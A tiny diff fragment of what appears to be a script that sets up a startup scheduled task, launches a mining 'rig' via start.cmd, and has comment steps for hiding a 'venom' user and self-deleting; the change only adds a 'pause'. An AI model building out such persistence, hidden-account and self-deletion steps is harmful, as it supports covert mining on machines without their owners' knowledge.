@@ -115,7 +115,7 @@ Write-Host "Scheduled task created successfully. Your CMD file will now run at s
 # start rig
 ./start.cmd
 
-
+pause
 # hide venom user
 
 # self delete
